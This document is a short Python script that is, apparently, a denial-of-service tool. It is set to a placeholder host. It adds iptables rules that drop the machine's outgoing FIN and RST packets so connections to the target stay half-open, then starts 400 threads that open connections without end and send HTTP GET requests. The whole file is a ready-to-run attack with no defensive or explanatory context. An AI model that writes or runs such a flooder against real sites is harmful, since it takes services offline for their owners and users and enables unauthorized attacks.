import socket, ssl, threading, os

host = "site.com" #1
porta = 80 #2

header = ('GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0\r\n'
'Connection: keep-alive\r\n\r\n' %host) #3

os.system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %(host,porta)) #4
os.system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %(host,porta)) #5

def DoS(): #6
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #SSL/HTTPS
            #s = ssl.wrap_socket(s, cert_reqs = ssl.CERT_NONE) #7
            s.settimeout(2)
            s.connect((host, porta))
            s.send(header)
            s.close()
        except Exception as e:
            print e

for x in range(400):
    threading.Thread(target=DoS).start()